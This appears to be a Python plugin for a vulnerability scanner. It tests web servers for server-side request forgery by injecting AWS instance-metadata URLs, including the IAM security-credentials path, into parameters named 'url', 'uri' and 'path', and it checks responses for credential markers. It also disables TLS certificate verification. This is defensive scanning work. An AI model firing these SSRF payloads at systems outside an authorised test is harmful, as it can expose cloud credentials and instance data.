import asyncio
import ssl
from plugins import NaslPlugin, PluginResult

class CloudMetadataSSRFProbeAWSIMDS(NaslPlugin):
    PLUGIN_ID = 1174
    NAME = "Cloud Metadata SSRF Probe (AWS IMDS)"
    FAMILY = "Web Applications"
    CVSS_SCORE = 9.1
    DESCRIPTION = "Specifically probes for AWS Instance Metadata Service (IMDS) access via SSRF by injecting metadata URL patterns into common request parameters. Successful access exposes AWS credentials, instance data, and IAM role information."
    SOLUTION = "Use IMDSv2 with PUT requests and session tokens. Block 169.254.169.254 at the network level. Disable IMDS on instances that do not need it."
    CVE = []
    PORTS = [80, 443, 8080, 8443]

    METADATA_URLS = [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/user-data/",
        "http://169.254.169.254/latest/meta-data/public-keys/",
        "http://169.254.169.254/latest/dynamic/instance-identity/document",
    ]

    SSRF_PARAMS = [
        "url",
        "uri",
        "path",
        "dest",
        "redirect",
        "target",
        "endpoint",
        "image",
        "img",
        "file",
        "load",
        "fetch",
        "proxy",
        "data",
        "source",
        "page",
    ]

    async def check_target(self, target: str, port: int | None = None) -> list[PluginResult]:
        results = []
        for port_to_check in (self.PORTS if port is None else [port]):
            for meta_url in self.METADATA_URLS:
                try:
                    scheme = "https" if port_to_check in (443, 8443) else "http"
                    ctx = None
                    if scheme == "https":
                        ctx = ssl.create_default_context()
                        ctx.check_hostname = False
                        ctx.verify_mode = ssl.CERT_NONE
                    reader, writer = await asyncio.wait_for(asyncio.open_connection(target, port_to_check, ssl=ctx), timeout=5)
                    host_header = target
                    if target in ("127.0.0.1", "localhost", "::1"):
                        host_header = "alieninc.tech"
                    query_string = "&".join([f"{p}={meta_url}" for p in self.SSRF_PARAMS[:3]])
                    request = (
                        f"GET /?{query_string} HTTP/1.1\r\n"
                        f"Host: {host_header}\r\n"
                        f"Connection: close\r\n"
                        f"\r\n"
                    )
                    writer.write(request.encode())
                    await writer.drain()
                    response = b""
                    while True:
                        chunk = await asyncio.wait_for(reader.read(4096), timeout=5)
                        if not chunk:
                            break
                        response += chunk
                    writer.close()
                    await writer.wait_closed()
                    decoded = response.decode("utf-8", errors="replace")
                    if "iam" in decoded.lower() or "role" in decoded.lower() or "AccessKeyId" in decoded:
                        results.append(PluginResult(
                            vulnerable=True,
                            target=target,
                            port=port_to_check,
                            description=f"Potential SSRF to AWS metadata endpoint {meta_url} succeeded"
                        ))
                except (asyncio.TimeoutError, ConnectionRefusedError, OSError, ssl.SSLError):
                    pass
        if not results:
            results.append(PluginResult(vulnerable=False, target=target, port=port or 0, description="No issues detected"))
        return results
